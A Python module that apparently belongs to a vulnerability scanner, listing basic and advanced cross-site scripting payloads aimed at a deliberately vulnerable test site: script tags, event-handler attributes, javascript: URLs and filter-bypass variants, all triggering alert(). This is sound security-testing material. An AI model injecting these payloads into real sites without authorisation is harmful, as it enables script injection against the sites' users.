"""
XSS payloads for testing Cross-Site Scripting vulnerabilities
"""

class XSSPayloads:
    """XSS payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic XSS payloads optimized for testphp.vulnweb.com"""
        return [
            # Basic script tags
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Image-based XSS
            '<img src=x onerror=alert(1)>',
            '<img src="x" onerror="alert(1)">',
            '<IMG sRC=X onerror=jaVaScRipT:alert`xss`>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            
            # SVG-based XSS
            '<svg onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg onload="alert(1)">',
            
            # Event handlers
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            
            # JavaScript URLs
            'javascript:alert(1)',
            'javascript:alert("XSS")',
            'javascript:alert(String.fromCharCode(88,83,83))',
            
            # HTML5 elements
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<meter onmouseover=alert(1)>',
            '<progress onmouseover=alert(1)>',
            
            # Iframe-based
            '<iframe src=javascript:alert(1)>',
            '<iframe src="javascript:alert(1)">',
            
            # Form-based
            '<form><button formaction=javascript:alert(1)>Click',
            '<form><input formaction=javascript:alert(1) type=submit value=Click>',
            
            # Simple payloads for parameter injection
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            
            # Attribute breaking
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '> <script>alert(1)</script>',
            
            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<script>ALERT(1)</script>'
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced XSS payloads"""
        return [
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg/onload=alert(/XSS/)>',
            '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            '<input type="image" src="x" onerror="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src="x" onerror="alert(\'XSS\')">'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all XSS payloads"""
        return XSSPayloads.get_basic_payloads() + XSSPayloads.get_advanced_payloads()
